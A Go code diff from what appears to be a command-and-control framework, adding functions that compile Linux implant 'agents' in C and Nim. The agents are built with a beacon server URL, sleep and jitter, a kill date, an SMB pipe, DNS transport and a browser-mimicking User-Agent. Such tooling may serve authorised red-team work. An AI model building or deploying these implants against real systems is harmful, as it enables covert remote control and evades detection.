@@ -1251,6 +1251,147 @@ func mtlsToHTTPFallback(serverURL string) string {
 	return u
 }
 
+// mtlsToHTTPSURL converts an mTLS URL (port 8443) to a plain HTTPS URL (port 443).
+// Linux agents do not support mTLS client certs, so they use the regular HTTPS listener.
+func mtlsToHTTPSURL(serverURL string) string {
+	return strings.Replace(serverURL, ":8443", ":443", 1)
+}
+
+// BuildCAgentLinux builds the C agent as a native Linux ELF binary.
+// Uses agents/agent-c/Makefile.linux with the system gcc.
+// If the transport is "mtls" the server URL is rewritten to the plain HTTPS port (443)
+// because the Linux transport does not implement mTLS client certificates.
+func BuildCAgentLinux(cfg BuildConfig, outDir string) (string, error) {
+	root  := projectRoot()
+	outDir = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+
+	agentDir := filepath.Join(root, "agents", "agent-c")
+	makefile := filepath.Join(agentDir, "Makefile.linux")
+	if _, err := os.Stat(makefile); err != nil {
+		return "", fmt.Errorf("Makefile.linux not found: %w", err)
+	}
+
+	sleepSec := cfg.SleepSec
+	if sleepSec <= 0 { sleepSec = 5 }
+	jitter := cfg.JitterPct
+	if jitter < 0 { jitter = 20 }
+
+	serverURL := cfg.ServerURL
+	if cfg.Transport == "mtls" {
+		serverURL = mtlsToHTTPSURL(serverURL)
+	}
+
+	outName := agentName(cfg, "_linux")
+	outPath := filepath.Join(outDir, outName)
+
+	ua := cfg.UserAgent
+	if ua == "" {
+		ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+	}
+
+	args := []string{
+		"-f", makefile,
+		fmt.Sprintf("AGENT_SERVER_URL=%s", serverURL),
+		fmt.Sprintf("AGENT_SLEEP_SEC=%d", sleepSec),
+		fmt.Sprintf("AGENT_JITTER_PCT=%d", jitter),
+		fmt.Sprintf("AGENT_USER_AGENT=%s", ua),
+		fmt.Sprintf("AGENT_KILL_DATE=%s", cfg.KillDate),
+		fmt.Sprintf("AGENT_SMB_PIPE=%s", func() string {
+			if cfg.SMBPipe != "" { return cfg.SMBPipe }
+			return "endgamepipe"
+		}()),
+		fmt.Sprintf("AGENT_BEACON_URIS=%s", cfg.BeaconURIs),
+		fmt.Sprintf("AGENT_CANARY_DOMAIN=%s", cfg.CanaryDomain),
+		fmt.Sprintf("AGENT_DNS_SERVER=%s", func() string {
+			if cfg.DNSServer != "" { return cfg.DNSServer }
+			return "8.8.8.8"
+		}()),
+		fmt.Sprintf("AGENT_DNS_DOMAIN=%s", cfg.DNSDomain),
+		"TARGET=" + outPath,
+	}
+
+	cmd := exec.Command("make", args...)
+	cmd.Dir = agentDir
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("c linux build failed: %v\n%s", err, out)
+	}
+	return outPath, nil
+}
+
+// BuildNimELF compiles the Nim agent as a native Linux ELF binary.
+// Runs nim natively on the build host (no cross-compilation needed when building on Linux).
+// If the transport is "mtls" the URL is rewritten to port 443 (plain HTTPS).
+func BuildNimELF(cfg BuildConfig, outDir string) (string, error) {
+	root  := projectRoot()
+	outDir = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+
+	nimDir := filepath.Join(root, "agents", "agent-nim")
+	if _, err := os.Stat(filepath.Join(nimDir, "agent.nim")); err != nil {
+		return "", fmt.Errorf("agent-nim not found in %s", nimDir)
+	}
+
+	nim, err := findNim()
+	if err != nil {
+		return "", err
+	}
+
+	sleepSec := cfg.SleepSec
+	if sleepSec <= 0 { sleepSec = 5 }
+	jitter := cfg.JitterPct
+	if jitter < 0 { jitter = 20 }
+
+	serverURL := cfg.ServerURL
+	if cfg.Transport == "mtls" {
+		serverURL = mtlsToHTTPSURL(serverURL)
+	}
+
+	outName := agentName(cfg, "_linux")
+	outPath := filepath.Join(outDir, outName)
+
+	args := []string{
+		"compile",
+		"--os:linux", "--cpu:amd64",
+		"-d:release", "-d:danger", "-d:strip",
+		"--app:console", "--opt:size",
+		"--hints:off", "--warnings:off",
+		"-d:noSleepMask",
+		fmt.Sprintf("-d:serverUrl=%s", serverURL),
+		fmt.Sprintf("-d:sleepSec=%d", sleepSec),
+		fmt.Sprintf("-d:jitterPct=%d", jitter),
+		fmt.Sprintf("-d:Transport=%s", cfg.Transport),
+		fmt.Sprintf("--out:%s", outPath),
+	}
+	if cfg.UserAgent != "" {
+		args = append(args, fmt.Sprintf("-d:UserAgent=%s", cfg.UserAgent))
+	}
+	if cfg.BeaconURIs != "" {
+		args = append(args, fmt.Sprintf("-d:BeaconURIs=%s", cfg.BeaconURIs))
+	}
+	if cfg.KillDate != "" {
+		args = append(args, fmt.Sprintf("-d:KillDate=%s", cfg.KillDate))
+	}
+	if cfg.SMBPipe != "" {
+		args = append(args, fmt.Sprintf("-d:SMBPipe=%s", cfg.SMBPipe))
+	}
+	if cfg.CanaryDomain != "" {
+		args = append(args, fmt.Sprintf("-d:CanaryDomain=%s", cfg.CanaryDomain))
+	}
+	args = append(args, filepath.Join(nimDir, "agent.nim"))
+
+	cmd := exec.Command(nim, args...)
+	cmd.Dir = nimDir
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("nim linux build failed: %v\n%s", err, out)
+	}
+	return outPath, nil
+}
+
 func buildLDFlags(cfg BuildConfig) string {
 	var flags []string
 	flags = append(flags, "-s", "-w")
